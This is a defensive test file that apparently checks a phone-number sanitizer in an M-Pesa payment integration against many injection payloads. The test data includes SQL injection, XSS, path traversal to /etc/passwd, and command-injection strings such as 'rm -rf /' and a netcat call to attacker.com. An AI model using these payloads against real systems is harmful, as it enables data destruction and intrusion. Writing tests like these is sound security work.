/**
 * Property-based tests for input sanitization security
 * Feature: mpesa-payment-integration, Property 10: Input Sanitization Security
 * Validates: Requirements 5.3
 */

import fc from 'fast-check';
import { sanitizePhoneNumber } from '../phoneValidation';

describe('Input Sanitization Security Properties', () => {
  // Property 10: Input Sanitization Security
  // For any customer input (phone numbers, amounts), the system should properly sanitize and validate to prevent injection attacks
  describe('Property 10: Input Sanitization Security', () => {
    test('should sanitize phone number inputs to prevent injection attacks', () => {
      fc.assert(
        fc.property(
          // Generate potentially malicious inputs
          fc.oneof(
            // SQL injection attempts
            fc.constant("'; DROP TABLE users; --"),
            fc.constant("' OR '1'='1"),
            fc.constant("254712345678'; DELETE FROM mpesa_transactions; --"),
            
            // XSS attempts
            fc.constant("<script>alert('xss')</script>254712345678"),
            fc.constant("254712345678<img src=x onerror=alert(1)>"),
            fc.constant("javascript:alert('xss')254712345678"),
            
            // Command injection attempts
            fc.constant("254712345678; rm -rf /"),
            fc.constant("254712345678 && curl malicious.com"),
            fc.constant("254712345678 | nc attacker.com 4444"),
            
            // Path traversal attempts
            fc.constant("../../../etc/passwd254712345678"),
            fc.constant("254712345678\\..\\..\\windows\\system32"),
            
            // LDAP injection attempts
            fc.constant("254712345678)(|(objectClass=*))"),
            fc.constant("*)(uid=*))(|(uid=*"),
            
            // NoSQL injection attempts
            fc.constant("254712345678'; return true; var x='"),
            fc.constant("254712345678\"; this.constructor.constructor('return process')().exit(); //"),
            
            // Unicode and encoding attacks
            fc.constant("254712345678\u0000"),
            fc.constant("254712345678%00"),
            fc.constant("254712345678\x00"),
            
            // Buffer overflow attempts
            fc.constant("254712345678" + "A".repeat(10000)),
            
            // Format string attacks
            fc.constant("254712345678%s%s%s%s"),
            fc.constant("254712345678%n%n%n%n"),
            
            // Regular expression DoS
            fc.constant("254712345678" + "(".repeat(1000) + ")".repeat(1000)),
            
            // Mixed malicious content
            fc.constant("254<script>alert(1)</script>712'; DROP TABLE users; --345678")
          ),
          (maliciousInput) => {
            const sanitized = sanitizePhoneNumber(maliciousInput);
            
            // Sanitized output should only contain digits
            expect(sanitized).toMatch(/^\d*$/);
            
            // Should not contain any script tags
            expect(sanitized).not.toMatch(/<script/i);
            expect(sanitized).not.toMatch(/javascript:/i);
            
            // Should not contain SQL injection patterns
            expect(sanitized).not.toMatch(/drop\s+table/i);
            expect(sanitized).not.toMatch(/delete\s+from/i);
            expect(sanitized).not.toMatch(/insert\s+into/i);
            expect(sanitized).not.toMatch(/update\s+set/i);
            expect(sanitized).not.toMatch(/union\s+select/i);
            
            // Should not contain command injection patterns
            expect(sanitized).not.toMatch(/[;&|`$()]/);
            expect(sanitized).not.toMatch(/rm\s+-rf/);
            expect(sanitized).not.toMatch(/curl\s+/);
            
            // Should not contain path traversal patterns
            expect(sanitized).not.toMatch(/\.\./);
            expect(sanitized).not.toMatch(/etc\/passwd/);
            expect(sanitized).not.toMatch(/windows\\system32/);
            
            // Should not contain null bytes or control characters
            expect(sanitized).not.toMatch(/\x00/);
            expect(sanitized).not.toMatch(/[\x00-\x1F\x7F]/);
            
            // Should not exceed reasonable length (prevents buffer overflow)
            expect(sanitized.length).toBeLessThanOrEqual(15);
            
            // Should preserve only the digits from the original input
            const originalDigits = maliciousInput.replace(/\D/g, '');
            const expectedSanitized = originalDigits.substring(0, 15);
            expect(sanitized).toBe(expectedSanitized);
          }
        ),
        { numRuns: 10 }
      );
    });

    test('should handle various encoding attacks safely', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            // URL encoding attacks
            fc.constant("254712345678%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
            fc.constant("254712345678%27%20OR%20%271%27%3D%271"),
            
            // HTML entity encoding
            fc.constant("254712345678&lt;script&gt;alert(1)&lt;/script&gt;"),
            fc.constant("254712345678&#60;script&#62;alert(1)&#60;/script&#62;"),
            
            // Unicode encoding
            fc.constant("254712345678\u003Cscript\u003Ealert(1)\u003C/script\u003E"),
            fc.constant("254712345678\u0027 OR \u00271\u0027=\u00271"),
            
            // Base64 encoding
            fc.constant("254712345678PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
            
            // Hex encoding
            fc.constant("254712345678\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"),
            
            // Double encoding
            fc.constant("254712345678%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E")
          ),
          (encodedInput) => {
            const sanitized = sanitizePhoneNumber(encodedInput);
            
            // Should only contain digits regardless of encoding
            expect(sanitized).toMatch(/^\d*$/);
            
            // Should not contain encoded malicious patterns
            expect(sanitized).not.toMatch(/%[0-9A-Fa-f]{2}/); // URL encoding
            expect(sanitized).not.toMatch(/&[a-zA-Z]+;/); // HTML entities
            expect(sanitized).not.toMatch(/&#\d+;/); // Numeric HTML entities
            expect(sanitized).not.toMatch(/\\x[0-9A-Fa-f]{2}/); // Hex encoding
            expect(sanitized).not.toMatch(/\\u[0-9A-Fa-f]{4}/); // Unicode encoding
            
            // Should be safe length
            expect(sanitized.length).toBeLessThanOrEqual(15);
          }
        ),
        { numRuns: 10 }
      );
    });

    test('should prevent ReDoS (Regular Expression Denial of Service) attacks', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            // Catastrophic backtracking patterns
            fc.constant("254712345678" + "a".repeat(1000) + "X"),
            fc.constant("254712345678" + "(".repeat(100) + "a".repeat(100) + ")".repeat(100)),
            fc.constant("254712345678" + "(a+)+$".repeat(50)),
            fc.constant("254712345678" + "(a|a)*".repeat(50)),
            
            // Nested quantifiers
            fc.constant("254712345678" + "(a*)*".repeat(20)),
            fc.constant("254712345678" + "(a+)+".repeat(20)),
            fc.constant("254712345678" + "(a?)*".repeat(20)),
            
            // Alternation with overlap
            fc.constant("254712345678" + "(a|a)*b".repeat(10)),
            fc.constant("254712345678" + "(.*a){10}X")
          ),
          (redosInput) => {
            const startTime = Date.now();
            const sanitized = sanitizePhoneNumber(redosInput);
            const endTime = Date.now();
            
            // Should complete quickly (under 100ms)
            expect(endTime - startTime).toBeLessThan(100);
            
            // Should still produce valid output
            expect(sanitized).toMatch(/^\d*$/);
            expect(sanitized.length).toBeLessThanOrEqual(15);
          }
        ),
        { numRuns: 5 } // Fewer runs for performance tests
      );
    });

    test('should handle international character attacks', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            // Right-to-left override attacks
            fc.constant("254712345678\u202E<script>alert(1)</script>"),
            fc.constant("254712345678\u202D' OR '1'='1"),
            
            // Zero-width characters
            fc.constant("254712345678\u200B<script>\u200Calert(1)\u200D</script>"),
            fc.constant("254712345678\uFEFF' OR '1'='1\u200B"),
            
            // Homograph attacks (lookalike characters)
            fc.constant("254712345678а<script>alert(1)</script>"), // Cyrillic 'а'
            fc.constant("254712345678ο' OR '1'='1"), // Greek 'ο'
            
            // Combining characters
            fc.constant("254712345678a\u0300\u0301\u0302<script>alert(1)</script>"),
            
            // Surrogate pairs
            fc.constant("254712345678\uD83D\uDE00<script>alert(1)</script>"), // Emoji
            
            // Normalization attacks
            fc.constant("254712345678\u00E9<script>alert(1)</script>"), // é (composed)
            fc.constant("254712345678e\u0301<script>alert(1)</script>") // é (decomposed)
          ),
          (unicodeInput) => {
            const sanitized = sanitizePhoneNumber(unicodeInput);
            
            // Should only contain ASCII digits
            expect(sanitized).toMatch(/^[0-9]*$/);
            
            // Should not contain any Unicode control characters
            expect(sanitized).not.toMatch(/[\u0000-\u001F\u007F-\u009F]/);
            expect(sanitized).not.toMatch(/[\u200B-\u200F\u202A-\u202E]/);
            expect(sanitized).not.toMatch(/[\uFEFF]/);
            
            // Should not contain high Unicode characters
            expect(sanitized).not.toMatch(/[\u0100-\uFFFF]/);
            
            // Should be reasonable length
            expect(sanitized.length).toBeLessThanOrEqual(15);
          }
        ),
        { numRuns: 10 }
      );
    });

    test('should prevent prototype pollution attacks', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            // Prototype pollution via __proto__
            fc.constant("254712345678__proto__[isAdmin]=true"),
            fc.constant("254712345678['__proto__']['isAdmin']=true"),
            
            // Constructor pollution
            fc.constant("254712345678constructor[prototype][isAdmin]=true"),
            fc.constant("254712345678['constructor']['prototype']['isAdmin']=true"),
            
            // JSON prototype pollution
            fc.constant('254712345678{"__proto__":{"isAdmin":true}}'),
            fc.constant('254712345678{"constructor":{"prototype":{"isAdmin":true}}}')
          ),
          (pollutionInput) => {
            const sanitized = sanitizePhoneNumber(pollutionInput);
            
            // Should only contain digits
            expect(sanitized).toMatch(/^\d*$/);
            
            // Should not contain prototype pollution patterns
            expect(sanitized).not.toMatch(/__proto__/);
            expect(sanitized).not.toMatch(/constructor/);
            expect(sanitized).not.toMatch(/prototype/);
            expect(sanitized).not.toMatch(/\[|\]/);
            expect(sanitized).not.toMatch(/\{|\}/);
            
            // Verify no prototype pollution occurred
            expect(Object.prototype.hasOwnProperty.call({}, 'isAdmin')).toBe(false);
            expect(({}as any).isAdmin).toBeUndefined();
          }
        ),
        { numRuns: 10 }
      );
    });

    test('should maintain consistent behavior with edge cases', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            // Null and undefined
            fc.constant(null),
            fc.constant(undefined),
            
            // Empty and whitespace
            fc.constant(''),
            fc.constant('   '),
            fc.constant('\t\n\r'),
            
            // Very long strings
            fc.constant('254712345678' + 'x'.repeat(10000)),
            
            // Binary data
            fc.constant('254712345678\x00\x01\x02\x03'),
            
            // Mixed content
            fc.constant('254abc712def345ghi678')
          ),
          (edgeInput) => {
            // Should not throw errors
            expect(() => sanitizePhoneNumber(edgeInput as any)).not.toThrow();
            
            const sanitized = sanitizePhoneNumber(edgeInput as any);
            
            // Should always return a string
            expect(typeof sanitized).toBe('string');
            
            // Should only contain digits or be empty
            expect(sanitized).toMatch(/^\d*$/);
            
            // Should not exceed length limit
            expect(sanitized.length).toBeLessThanOrEqual(15);
          }
        ),
        { numRuns: 10 }
      );
    });
  });
});